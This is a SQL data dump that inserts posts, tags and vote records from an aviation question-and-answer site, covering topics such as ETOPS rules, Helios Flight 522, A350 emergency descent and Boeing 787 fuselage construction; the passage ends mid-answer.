INSERT INTO postinstance (post_id, user_id, description) VALUES (186, 8, '&lt;p&gt;What are the aerodynamic advantages and disadvantages of the Weltensegler Wing?&lt;/p&gt;

&lt;p&gt;Would this kind of wing configuration come to help for a glider? 
Is there any difference between them and gull wings? 
What are the aerodynamic advantages of gull wings?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/zM2nE.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/zM2nE.jpg&quot; alt=&quot;Weltensegler Aircraft&quot;&gt;&lt;/a&gt; &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (186, 3, 'What are the aerodynamic advantages and disadvantages of the Weltensegler wing?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (186, 186, 8, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (186, 144);
INSERT INTO questiontag (question_id, tag_id) VALUES (186, 142);
INSERT INTO tag (text) VALUES ('fixed-wing');
INSERT INTO questiontag (question_id, tag_id) VALUES (186, 163);
INSERT INTO activity (post_id, user_id, action) VALUES (186, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (186, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (186, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (186, 8, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (186, 8, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (187, 29, '&lt;p&gt;In 2009 Airbus went public with a new feature in the Airbus A350, an &lt;a href=&quot;https://www.flightglobal.com/news/articles/airbus-a350-could-be-equipped-with-automatic-emergency-descent-system-330988/&quot; rel=&quot;nofollow noreferrer&quot;&gt;Automatic Emergency Descent (AED) System&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The system would detect a rapid depressurization and, after a defined waiting time, would initiate an automated descent if the pilots failed to respond to the respective alert (i.e. in case of pilot incapacitation).&lt;/p&gt;

&lt;p&gt;I found &lt;a href=&quot;http://www.ae-expo.eu/wp-content/uploads/2015/04/Florent-Lanterna-AEE-Aviation-Electronics-Europe-2015-AED.pdf&quot; rel=&quot;nofollow noreferrer&quot;&gt;some presentation slides from 2015&lt;/a&gt; on the topic but haven&#x27;t heard anything on that system since. Does anyone have additional information: is it a standard feature now on the A350, is it optional, or was it not pursued any further? If not, for what reasons?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (187, 3, 'Does the Airbus A350 have an Automatic Emergency Descent System?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (187, 187, 29, 'Create');
INSERT INTO tag (text) VALUES ('safety');
INSERT INTO questiontag (question_id, tag_id) VALUES (187, 164);
INSERT INTO tag (text) VALUES ('aircraft-systems');
INSERT INTO questiontag (question_id, tag_id) VALUES (187, 165);
INSERT INTO tag (text) VALUES ('cabin-pressure');
INSERT INTO questiontag (question_id, tag_id) VALUES (187, 166);
INSERT INTO tag (text) VALUES ('emergency-procedures');
INSERT INTO questiontag (question_id, tag_id) VALUES (187, 167);
INSERT INTO tag (text) VALUES ('airbus-a350');
INSERT INTO questiontag (question_id, tag_id) VALUES (187, 168);
INSERT INTO activity (post_id, user_id, action) VALUES (187, 29, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (187, 29, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (187, 29, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (187, 29, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 5, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (188, 32, '&lt;p&gt;Are there different ETOPS requirements for aircraft depending on usage?  For example, does a FedEx cargo flight need the same ETOPS ratings for over ocean flights as a passenger flight?  Also, how about ferry or repositioning flights which are not revenue flights?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (188, 3, 'Does ETOPS requirement vary on passenger, cargo and non-revenue flights?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (188, 188, 32, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (188, 146);
INSERT INTO tag (text) VALUES ('etops');
INSERT INTO questiontag (question_id, tag_id) VALUES (188, 169);
INSERT INTO activity (post_id, user_id, action) VALUES (188, 32, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (188, 32, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (188, 32, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (188, 32, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (188, 32, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 17, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (189, 24, '&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Helios_Airways_Flight_522&quot; rel=&quot;noreferrer&quot;&gt;Helios Flight 522&lt;/a&gt; crashed when the crew unknowingly suffered hypoxia. Although the masks in the passenger cabin deployed, the crew were unaware of this and didn&#x27;t realise the extent of the problem.   &lt;/p&gt;

&lt;p&gt;If I was a passenger on a plane at cruise altitude and the oxygen masks deployed, I know that there is only about 10 minutes oxygen available. I would expect the plane to immediately descend to a lower altitude.&lt;/p&gt;

&lt;p&gt;If I don&#x27;t notice any change in attitude and there is no passenger announcement after a few minutes, would it help to alert a flight attendant to check that the pilots are aware of the issue? Or would it be best to assume that &#x27;they know what they are doing&#x27; and just keep quiet?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (189, 3, 'Could a knowledgeable passenger have saved Helios Flight 522?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (189, 189, 24, 'Create');
INSERT INTO tag (text) VALUES ('emergency');
INSERT INTO questiontag (question_id, tag_id) VALUES (189, 170);
INSERT INTO tag (text) VALUES ('passenger');
INSERT INTO questiontag (question_id, tag_id) VALUES (189, 171);
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (189, 24, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (190, 48, '&lt;p&gt;I would like to know which hub has more seats capacity to Africa as a whole, whichever destination.&lt;/p&gt;

&lt;p&gt;Thank you,
Avi&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (190, 3, 'Which European (incl. Turkey) hub has the biggest seats capacity to destinations in Africa?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (190, 190, 48, 'Create');
INSERT INTO tag (text) VALUES ('capacity');
INSERT INTO questiontag (question_id, tag_id) VALUES (190, 172);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 7, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (191, 31, '&lt;p&gt;Per &lt;a href=&quot;http://www.ecfr.gov/cgi-bin/retrieveECFR?gp&amp;amp;r=PART&amp;amp;n=14y2.0.1.1.2#se14.2.61_1129&quot;&gt;14 CFR 61.129&lt;/a&gt;, a person who applies for a commercial pilot certificate for airplanes (both single and multiengine) must log at least ten hours of instrument training.&lt;/p&gt;

&lt;p&gt;Assuming a pilot obtains their instrument rating prior to training for their commercial pilot certificate, can the instrument time logged during training for an instrument rating be used to satisfy this requirement (assuming class of aircraft requirements are met)?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (191, 3, 'Can training for an Instrument Rating be applied towards a commercial pilot certificate?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (191, 191, 31, 'Create');
INSERT INTO tag (text) VALUES ('faa-regulations');
INSERT INTO questiontag (question_id, tag_id) VALUES (191, 173);
INSERT INTO tag (text) VALUES ('far-61');
INSERT INTO questiontag (question_id, tag_id) VALUES (191, 174);
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (191, 31, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (192, 41, '&lt;p&gt;For a typical turbofan jet engine (two examples given in the title), what is the exhaust velocity and mass flow rate of air at sea level and cruising altitude (~ FL350)? &lt;/p&gt;

&lt;p&gt;Also, does the specific impulse vary at different altitudes, since the density of air decreases with increases in altitude?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (192, 3, 'What is the mass flow rate and exhaust velocity of air from a GE CF6 or GE90 turbofan?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (192, 192, 41, 'Create');
INSERT INTO tag (text) VALUES ('jet-engine');
INSERT INTO questiontag (question_id, tag_id) VALUES (192, 175);
INSERT INTO tag (text) VALUES ('propulsion');
INSERT INTO questiontag (question_id, tag_id) VALUES (192, 176);
INSERT INTO tag (text) VALUES ('fluid-mechanics');
INSERT INTO questiontag (question_id, tag_id) VALUES (192, 177);
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (192, 41, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (193, 9, '&lt;p&gt;How can pilots balance a commercial airplane during flight without using elevators?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (193, 3, 'How can a commercial aircraft be balanced in flight without the elevators?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (193, 193, 9, 'Create');
INSERT INTO tag (text) VALUES ('aircraft-performance');
INSERT INTO questiontag (question_id, tag_id) VALUES (193, 178);
INSERT INTO tag (text) VALUES ('flight-controls');
INSERT INTO questiontag (question_id, tag_id) VALUES (193, 179);
INSERT INTO activity (post_id, user_id, action) VALUES (193, 9, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 8, 4);
INSERT INTO postinstance (post_id, user_id, description) VALUES (194, 12, '&lt;p&gt;I was listening to Norcal yesterday and heard a controller request an airplane increase speed to 210 knots &quot;if able&quot;. The plane was previously at ~180 knots. The pilot responded he had flaps 2 and politely declined.&lt;/p&gt;

&lt;p&gt;Can TRACON demand a plane increase speed if the controller already assigned a slower speed?
And if yes, what would be the phraseology? &quot;Maintain 210 knots or greater until DUMBA&quot;? (I don&#x27;t think I&#x27;ve ever heard that when a plane was &lt;em&gt;slower&lt;/em&gt;.)&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (194, 3, 'Can TRACON increase plane speed on approach?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (194, 194, 12, 'Create');
INSERT INTO tag (text) VALUES ('air-traffic-control');
INSERT INTO questiontag (question_id, tag_id) VALUES (194, 180);
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (194, 12, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (195, 49, '&lt;p&gt;I have a list of airports in Europe and I need to find up-to-date information about ILS categories (I, II, IIIa, IIIb or IIIc) at these airports. Does anyone know where I could find such data efficiently?&lt;/p&gt;

&lt;p&gt;Thanks!&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (195, 3, 'Where to find information on ILS categories at European airports?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (195, 195, 49, 'Create');
INSERT INTO tag (text) VALUES ('ils');
INSERT INTO questiontag (question_id, tag_id) VALUES (195, 181);
INSERT INTO activity (post_id, user_id, action) VALUES (195, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (195, 49, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 16, 4);
INSERT INTO postinstance (post_id, user_id, description) VALUES (196, 40, '&lt;p&gt;I just read &lt;a href=&quot;http://www.dailymail.co.uk/travel/travel_news/article-4342230/A-day-life-long-haul-airline-pilot-revealed.html&quot; rel=&quot;noreferrer&quot;&gt;an article about a day in the life of a pilot&lt;/a&gt; and it states &quot;The Captain always controls the thrust in the unlikely event that the take-off needs to be aborted for safety reasons.&quot; Is this correct?  &lt;/p&gt;

&lt;p&gt;It was always my understanding that the roles of PF and PNF can be alternated between the captain and first officer, and controlling the thrust would fall into one role or the other. I also recall seeing videos of the flight engineer pushing the throttles. &lt;/p&gt;

&lt;p&gt;If the take-off needs to be aborted, can&#x27;t the captain just command the FO to &quot;abort&quot; or take control by saying &quot;I have control&quot; or similar?  &lt;/p&gt;

&lt;p&gt;Finally, will pulling back the throttles be enough to abort takeoff safely without braking? Surely it would just cause more problems?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (196, 3, 'Does the captain always control thrust on takeoff?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (196, 196, 40, 'Create');
INSERT INTO tag (text) VALUES ('pilots');
INSERT INTO questiontag (question_id, tag_id) VALUES (196, 182);
INSERT INTO tag (text) VALUES ('cockpit');
INSERT INTO questiontag (question_id, tag_id) VALUES (196, 183);
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (196, 40, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (197, 38, '&lt;p&gt;PPL student, wondering on how this practice is viewed. The aircraft I&#x27;m learning to fly in has a small Dynon EFIS which displays horizon, airspeed, heading &amp;amp; altitude. It also has a regular altimeter.&lt;/p&gt;

&lt;p&gt;Assuming I&#x27;m going for a local flight, returning to land where I departed, is it OK practice to leave the Dynon on QFE and the Altimeter on QNH? This way I don&#x27;t have to change any settings. &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (197, 3, 'Is it OK practice to use one altimeter on QFE and one on QNH (local flight, dual altimeters)');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (197, 197, 38, 'Create');
INSERT INTO tag (text) VALUES ('general-aviation');
INSERT INTO questiontag (question_id, tag_id) VALUES (197, 184);
INSERT INTO tag (text) VALUES ('altimeter');
INSERT INTO questiontag (question_id, tag_id) VALUES (197, 185);
INSERT INTO activity (post_id, user_id, action) VALUES (197, 38, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 5, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (198, 3, '&lt;p&gt;I am intensively researching on &lt;a href=&quot;https://en.wikipedia.org/wiki/XL_Airways_Germany_Flight_888T&quot; rel=&quot;nofollow noreferrer&quot;&gt;XL Airways Germany Flight 888T&lt;/a&gt; at the moment. &lt;/p&gt;

&lt;p&gt;I wrote and researched hours and hours. Now I would like to know something about the ECAM and the Airbus Stall warning:&lt;/p&gt;

&lt;p&gt;The crew of 888T started a stall test with faulty AoA-Sensors. They wanted to test the stall protection system. At a point, the Airbus stall warning was played. A few seconds later, the control laws degraded to &lt;em&gt;Direct Law&lt;/em&gt;. The crew missed this degradation and I just want to find out why.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://aviation.stackexchange.com/questions/36268&quot;&gt;I found out&lt;/a&gt;, a control law degradation is a level 2 ECAM warning. That means a single chime will be played. Can someone confirm this?&lt;/p&gt;

&lt;p&gt;I also heard, the stall warning suppresses all other sounds, because a stall has priority over all other things. But I don&#x27;t know if this also applies for the ECAM Sounds. Does anybody know if a stall warning really suppresses every sound?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (198, 3, 'Could the crew of XL Airways Germany Flight 888T not hear important chimes, due to the stall warning?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (198, 198, 3, 'Create');
INSERT INTO tag (text) VALUES ('airbus-a320');
INSERT INTO questiontag (question_id, tag_id) VALUES (198, 186);
INSERT INTO tag (text) VALUES ('airbus');
INSERT INTO questiontag (question_id, tag_id) VALUES (198, 187);
INSERT INTO tag (text) VALUES ('ecam');
INSERT INTO questiontag (question_id, tag_id) VALUES (198, 188);
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (198, 3, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 6, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (199, 28, '&lt;p&gt;I am particularly interested in the Boeing 787 Fuselage because it is one of the first aircraft to carry such a high percentage of Carbon Fibre Reinforced Polymer (CFRP). &lt;/p&gt;

&lt;p&gt;Can someone explain how the fuselage is made? I know the basics of making 
CFRP which include fibre being wrapped onto in mandrel in different orientations then heating in an autoclave to cure.&lt;/p&gt;

&lt;p&gt;However, I also know that the whole fuselage is not produced in one piece. Pieces of the fuselage are produced then joined together. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I would like to know the joining process works. &lt;/li&gt;
&lt;li&gt;Since it is not fabricated as a single piece there are bound to be stresses on the joints. Will it effect/endanger the passengers? &lt;/li&gt;
&lt;li&gt;What loads can it take since the joints will cause a drop in overall pressure (what is the maximum pressure if possible). I don&#x27;t think its being welded together but not sure the reason. &lt;/li&gt;
&lt;li&gt;Are the same methods used to join the wings? &lt;/li&gt;
&lt;li&gt;Last but not least, are there problems due to the joints before and if so, what has been done to rectify these problems?&lt;/li&gt;
&lt;/ul&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (199, 3, 'How is the fuselage of the Boeing 787 produced?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (199, 199, 28, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (199, 144);
INSERT INTO questiontag (question_id, tag_id) VALUES (199, 142);
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (199, 28, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (200, 49, '&lt;p&gt;Recently, I saw that video:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT:&lt;/strong&gt; I removed the Facebook video link which would require sign up for anyone without an account. I&#x27;ve re-uploaded the video here:
&lt;a href=&quot;https://vid.me/8WYI&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://vid.me/8WYI&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In general, this guy&#x27;s videos seem to me more like a &quot;conspiracy theories&quot; thing, but I hadn&#x27;t the time to study them and find the underlying faulty logic. So, in that particular video, he claims that the cargo door of an aircraft wasn&#x27;t working properly and the ground staff simply decided to use a heavy load on the lever in order to open it (or something like that).&lt;/p&gt;

&lt;p&gt;Because of that incident the plane shouldn&#x27;t be allowed to fly (that&#x27;s what he claims) and also there is immediate safety concern for the people on the ground because of the weight they used.&lt;/p&gt;

&lt;p&gt;My questions are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Is the cargo door in that airplane really malfunctioning?&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Do the ground staff follow a standard procedure for the &quot;workaround&quot;?&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Although I understand that the way the weight is &quot;hanged&quot; on the that
lever is not a safe solution, my logic says that it could never fall 
from that position. Am I right?&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (200, 3, 'Is the cargo door on this airplane really malfunctioning?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (200, 200, 49, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (200, 164);
INSERT INTO tag (text) VALUES ('ground-operations');
INSERT INTO questiontag (question_id, tag_id) VALUES (200, 189);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 7, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (201, 49, '&lt;p&gt;Or a new aircraft would have to be designed for such a thing? I have little knowledge of aviation, so please feel free to fill me in the required bits.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (201, 3, 'Is it possible to integrate an AI CoPilot on existing planes?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (201, 201, 49, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (201, 144);
INSERT INTO tag (text) VALUES ('artificial-intelligence');
INSERT INTO questiontag (question_id, tag_id) VALUES (201, 190);
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (201, 49, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (202, 33, '&lt;p&gt;If you remember that the air is really a swarm of molecules moving in all directions at very high speed, and that pressure -static or dynamic- is caused by the impact of those molecules, then everything is very clear...&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (202, 172, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (202, 33, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (203, 42, '&lt;p&gt;If you update the register, the values will be set to the values provided.
From that moment, a timer starts running. When the timer reaches maxUpdateInterval, the register will be set to all zero. &lt;/p&gt;

&lt;p&gt;If a radar extracts the register before the maxUpdateInterval is reached, it will get the values provided at the update. If it will extract the register after maxUpdateInterval is reached, it will get all zeros in the reply. &lt;/p&gt;

&lt;p&gt;For ADS-B, transmission of the register is inhibited (IIRC) when the register is set to all zeros. &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (203, 175, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (203, 42, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (203, 42, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (204, 43, '&lt;p&gt;You are very close. Your explanation of static pressure is correct, but not your dynamic pressure. Ram air pressure is what the pitot tube measures, in other words the total pressure experienced. It is your airspeed gauge which measures dynamic pressure by mechanically (in the case of a traditional pitot-static system) subtracting ram air pressure from static pressure. &lt;/p&gt;

&lt;p&gt;If I was explaining this to a layman I would say that ram air pressure is equivalent to sticking your hand out the window of a moving car, while static pressure is the pressure inside the car. That&#x27;s a bit of an over-simplification as the pressure inside the car will be lower than outside due to the movement through the air, but it gets the point across. &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (204, 172, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (204, 43, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (205, 12, '&lt;p&gt;Use an energy analogy:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Dynamic pressure equals kinetic energy,&lt;/li&gt;
&lt;li&gt;Static pressure equals potential energy.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Total energy = total pressure.&lt;/p&gt;

&lt;p&gt;For the more math inclined: In the gravity field of earth, potential energy is mass times gravity acceleration times height: $E_{pot} = m\cdot g\cdot h$. Kinetic energy is mass times speed squared, divided by 2: $E_{kin} = m\cdot\frac{v^2}{2}$. Dynamic pressure $q$ is similarly density times speed squared, divided by 2: $q = \rho\cdot\frac{v^2}{2}$, which makes it a volume-specific kinetic energy.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (205, 172, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (205, 12, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (206, 49, '&lt;p&gt;The cargo hold is indeed vacuumed, using a vacuum cleaner, regularly.
It is however NOT drawn vacuum (so having all air removed).
